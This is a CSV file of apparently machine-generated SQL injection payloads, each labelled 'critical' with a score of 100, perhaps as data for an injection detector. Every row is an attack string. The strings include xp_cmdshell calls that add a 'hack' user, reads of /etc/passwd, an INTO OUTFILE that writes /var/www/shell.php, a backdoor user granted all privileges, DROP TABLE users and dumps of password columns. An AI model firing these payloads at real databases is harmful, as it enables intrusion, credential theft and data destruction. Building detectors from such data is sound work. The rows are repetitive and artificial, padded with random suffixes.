query,risk,score
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # qfgk7z4,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1 -- ,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 # ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 # ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 # ,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ /**/",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 # ,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1 -- ,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ # 45",critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ -- 3",critical,100
'; DROP TABLE users; -- /* test */ AND 1=1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- # iqc87ai,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # qqzqmu0,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- aomddm,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- -- 6kpz8h,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ -- f,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- im3l0n,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # 0cg3nzp,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # jdna8st,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 # ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ /**/,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- -- 582mtx,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/ /**/,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # ih1063c,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- s2ssyh",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- LIMIT 1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- LIMIT 1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- AND 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 # ",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- xpkaey,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1 -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- y0eias,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1 -- ,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- # z0o3q6b,critical,100
"' UNION SELECT username, password FROM users /**/ /* # p67zbpl",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # quccvql,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 # ,critical,100
'; DROP TABLE users; -- /* test */ /**/ /**/,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 # ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- g47n6l,critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- v47abr,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # ix817b9,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1 -- ",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # mmoyxwd,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ /**/,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ # wb",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1 -- ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ # gq,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 # ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 # ",critical,100
'; DROP TABLE users; -- /* test */ # 2hjwgaz,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- 1vv3w0,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1 -- ",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # rc53fox,critical,100
"' UNION SELECT username, password FROM users /**/ /* # m8plshu",critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- rkfud7,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ # 4f,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- LIMIT 1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1 -- ",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/ -- g",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # gc9hwxd",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ # zm,critical,100
'; DROP TABLE users; -- /* test */ -- h35knp,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 # ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- # km6mmnc,critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 # ,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- AND 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 7wgxnja",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # una2h38,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- LIMIT 1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- LIMIT 1 -- ",critical,100
'; SELECT * FROM mysql.user; -- -- 91f2az,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ -- 6,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- LIMIT 1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- LIMIT 1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- OR 1=1 # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # 6akhxb4",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ /**/,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- 1tts4r",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- AND 1=1 -- ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- LIMIT 1 -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 # ,critical,100
'; SELECT * FROM mysql.user; -- # f9nwwoi,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- # a79efrc,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 68ouej6,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- dlz9fw",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ # nn,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- xgl6e2,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/ -- k",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 # ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- /**/ # 1g,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* OR 1=1 # ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- # 62psqvt,critical,100
'; SELECT * FROM mysql.user; -- # u6oo7lb,critical,100
'; DROP TABLE users; -- /* test */ # 0pr3x4y,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ /**/,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1 -- ,critical,100
'; DROP TABLE users; -- /* test */ # vduano8,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1 -- ",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 # ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- AND 1=1 -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- xatyoc,critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1 -- ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- -- xnq6cv,critical,100
'; DROP TABLE users; -- /* test */ -- wuzuul,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # esnh177,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- toyuei,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ -- q,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1 -- ",critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ /**/",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # szbb2ij,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- /**/ -- r,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # ttys6rl,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ # wh,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
'; DROP TABLE users; -- /* test */ LIMIT 1 -- ,critical,100
'; SELECT * FROM mysql.user; -- # 0oakyca,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- LIMIT 1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # 6rqvymt",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- -- 7qepqo",critical,100
"' UNION SELECT username, password FROM users /**/ /* OR 1=1 # ",critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1 -- ",critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ -- l",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1 -- ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ /**/,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- vynqjc,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # zlrz45d",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # kudymcq,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ /**/,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- AND 1=1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # -- eipyx1,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ -- 2,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1 -- ,critical,100
'; SELECT * FROM mysql.user; -- -- 8o1zcy,critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1 -- ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1 -- ,critical,100
'; DROP TABLE users; -- /* test */ OR 1=1 # ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- 7hi2gs,critical,100
' INTO OUTFILE '/var/www/shell.php' -- AND 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- /**/ # k2",critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- AND 1=1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # c32ao70",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- -- d39ysz,critical,100
'; SELECT * FROM mysql.user; -- -- bth05h,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ # xl,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1 -- ",critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1 -- ,critical,100
'; SELECT * FROM mysql.user; -- # 0kyaa29,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- OR 1=1 # ",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- /**/ # dh,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- 94vvdp,critical,100
'; DROP TABLE users; -- /* test */ /**/ -- 6,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- /**/ # xf,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- sf2cbj",critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- c10bc3,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- -- jx8t2y,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- AND 1=1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # rxjrhos,critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- # 6ldfvay,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1 -- ,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- LIMIT 1 -- ,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- /**/ -- s,critical,100
"' UNION SELECT username, password FROM users /**/ /* LIMIT 1 -- ",critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1 -- ",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1 -- ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ /**/,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- OR 1=1 # ,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- /**/ # 9h,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- # s7x9mh9,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- LIMIT 1 -- ,critical,100
'; DROP TABLE users; -- /* test */ -- 7hfiwr,critical,100
"' UNION SELECT username, password FROM users /**/ /* AND 1=1 -- ",critical,100
'; SELECT * FROM mysql.user; -- AND 1=1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- AND 1=1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- 7748wy",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- AND 1=1 -- ,critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- /**/ -- a",critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # iujdbcb",critical,100
'; SELECT load_file('/etc/passwd'); # -- 33pdae,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ /**/,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- LIMIT 1 -- ,critical,100
"' UNION SELECT username, password FROM users /**/ /* # y6wb1ib",critical,100
"' UNION SELECT username, password FROM users /**/ /* # p12ijjg",critical,100
'; DECLARE @cmd VARCHAR(4000); SET @cmd = 'xp_cmdshell ''dir'''; EXEC(@cmd); -- LIMIT 1 -- ,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- /**/ -- j,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- AND 1=1 -- ",critical,100
' INTO OUTFILE '/var/www/shell.php' -- /**/ /**/,critical,100
'; SELECT load_file('/etc/passwd'); # OR 1=1 # ,critical,100
'; WITH REC AS (SELECT 1 a UNION ALL SELECT a+1 FROM REC WHERE a<100) SELECT * FROM REC; -- OR 1=1 # ,critical,100
"' UNION SELECT username, password FROM users /**/ /* -- xxpsub",critical,100
'; SELECT load_file('/etc/passwd'); # # 0qd778i,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- bm8lap,critical,100
'; LOAD DATA INFILE '/etc/passwd' INTO TABLE users; -- OR 1=1 # ,critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
"' UNION SELECT username, password FROM users /**/ /* /**/ # 7j",critical,100
'; SELECT * FROM mysql.user; -- OR 1=1 # ,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- # uny2ayq",critical,100
' INTO OUTFILE '/var/www/shell.php' -- OR 1=1 # ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- # u9myhrt",critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # y81qy4e,critical,100
"'; CALL mysql.lambda_async('127.0.0.1', 1234, 'shell'); -- -- e1im9k",critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- LIMIT 1 -- ,critical,100
'; SELECT load_file('/etc/passwd'); # AND 1=1 -- ,critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- -- 1i0awr,critical,100
'; CREATE USER 'hack'@'%' IDENTIFIED BY 'hack'; GRANT ALL PRIVILEGES ON *.* TO 'hack'@'%'; -- # fdtori7,critical,100
' INTO OUTFILE '/var/www/shell.php' -- LIMIT 1 -- ,critical,100
"'; SELECT MD5(BENCHMARK(100000,MD5('x'))); -- OR 1=1 # ",critical,100
'; CREATE TRIGGER malicious_trigger BEFORE INSERT ON users FOR EACH ROW SET NEW.admin = 1; -- # 6jg7lkd,critical,100
'; USE information_schema; SELECT table_schema FROM tables; -- -- oz0aaj,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- OR 1=1 # ,critical,100
'; SELECT load_file('/etc/passwd'); # /**/ -- 5,critical,100
' INTO OUTFILE '/var/www/shell.php' -- -- 9dawrv,critical,100
'; EXEC xp_cmdshell('net user hack hack /add'); -- # f2cffju,critical,100
"' UNION SELECT username, password FROM users /**/ /* OR 1=1 # ",critical,100
'; SELECT * FROM users INTO OUTFILE '/tmp/dump.txt'; -- -- yx7q1q,critical,100
'; SELECT load_file('/etc/passwd'); # # v3xh73r,critical,100
'; SELECT load_file('/etc/passwd'); # LIMIT 1 -- ,critical,100
